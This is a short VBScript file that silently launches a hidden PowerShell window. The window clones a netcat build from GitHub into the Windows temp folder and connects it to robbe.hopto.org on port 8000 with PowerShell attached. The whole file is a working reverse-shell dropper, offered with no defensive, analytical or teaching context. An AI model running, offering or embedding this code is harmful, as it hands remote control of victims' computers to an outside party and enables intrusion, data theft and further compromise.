Dim objShell
Set objShell=CreateObject("WScript.Shell")
strExpression="cd /Windows/temp; git clone https://github.com/robbelouwet/nc.git; cd nc; ./nc robbe.hopto.org 8000 -e powershell.exe"
strCMD="powershell -sta -noProfile -NonInteractive  -nologo -command " & Chr(34) &_
"&{" & strExpression &"}" & Chr(34) 
objShell.Run strCMD,0
